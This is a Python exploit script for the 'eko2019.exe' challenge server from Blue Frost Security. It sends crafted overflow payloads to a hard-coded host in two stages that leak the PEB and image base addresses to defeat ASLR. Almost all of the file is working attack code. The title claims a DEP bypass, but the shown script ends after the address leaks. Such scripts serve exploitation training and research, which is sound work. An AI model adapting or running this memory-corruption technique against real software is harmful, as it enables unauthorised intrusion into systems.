# Blue Frost Security 'eko2019.exe' Memory Corruption (ASLR and DEP Bypass)
# Full ASLR bypass with information leak (no need for non-ASLR modules)
# Author: Connor McGarr
# In muts we trust.
# Tested on Windows 10 x64
import sys
import os
import socket
import struct
import time

# 1st check: First 0x10 (16 bytes) are interpreted as the "header"
# 2nd check: Header starts with 0x393130326f6b45 (Eko2019)
# 3rd check: Message must be < 0x201 (513) bytes

# Defining sleep shorthand
sleep = time.sleep

# Begin header

# Adding null terminator in front of Eko2019 string to let eok2019.exe know this is where our header starts
print "[+] Sending the header..."
exploit = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# Exploit begins here

# 560 bytes for total crash (16 for header, 544 for the exploit)
# 512 byte offset to the byte we control
exploit += "\x41" * 512

# This byte converts the instruction we land on after the WriteProcessMemory() call
# \x65 turns this instruction we land on to mov rax,qword ptr gs:[rcx] instead of DS segment register
# The GS segment register gives us access to the PEB at an offset of 0x60
exploit += "\x65"

# \x60 will be moved in gs:[rcx] (\x41's are padding)
exploit += "\x41\x41\x41\x41\x41\x41\x41\x60"

# Making sure only \x60 is in rcx
# Must be a multiple of 8- so using \x41 as padding to reach 8 bytes
exploit += "\x00\x00\x00\x00\x00\x00\x00"

# Message needs to be 528 bytes total (1 byte short of the 529 crash)
exploit += "\x42" * (544-len(exploit))

print "[+] Sending first stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit)

# Call to eko+0x1000 function (where WriteProcessMemory writes out 1 byte user controlled buffer) returns the value into RAX
# After value is in RAX- the server responds with this result (RAX). Here, we are receiving that response and parsing it to find PEB
receive = s.recv(1024)

# Unpacking the response
print "[+] Extracting the PEB of eko2019.exe..."
unpack = struct.unpack_from('<Q', receive)

# Indexing the response (only 1 entry, which is the PEB returned in RAX after call to eko2019+0x100)
peb_addr = unpack[0]

# Print update for PEB location
print "[+] PEB is located at: {0}".format(hex(peb_addr))

# Closing the first stage request connection
s.close()

# Current image (eko2019.exe) base is located at PEB + 0x10
image_base = peb_addr + 0x10
print "[+] Image Base Address for eko2019.exe is located at: {0}".format(hex(image_base))

# Allocate some buffer time between first and second request
sleep(2)

# Second stage- extract the pointer to Image Base Address (which is the base virtual address for eko2019.exe)

# Predefining the Image Base Address in the form of an unsigned long long
real_image_base = struct.pack('<Q', image_base)

# We need to resend the header and setup the second request structure similar to the first.
print "[+] Resending the header for the second stage request..."
exploit_2 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 512 byte offset to the byte we control
exploit_2 += "\x41" * 512

# A NOP will let our instruction slide into a mov rax, qword ptr ds:[rcx] instruction
exploit_2 += "\x90"

# Padding to loading our value into rcx
exploit_2 += "\x41\x41\x41\x41\x41\x41\x41"

# Filling RCX with before hand with our Image Base Address for eko2019.exe
# This mov rax, qword ptr ds:[rcx] operation will extract the pointer and return the actual virtual address base of eko2019.exe
exploit_2 += real_image_base

# Need 528 total bytes
exploit_2 += "\x42" * (544-len(exploit_2))

print "[+] Sending second stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_2)

# Reading in rax in the response
receive_2 = s.recv(1024)

# Unpacking the response
print "[+] Extracting the base address of eok2019.exe..."
unpack_2 = struct.unpack_from('<Q', receive_2)

# Indexing the response
base_address = unpack_2[0]

# Print update the virtual address base of eko2019.exe
print "[+] Base virtual address of eko2019.exe is located at: {0}".format(hex(base_address))

# Closing the second stage request
s.close()
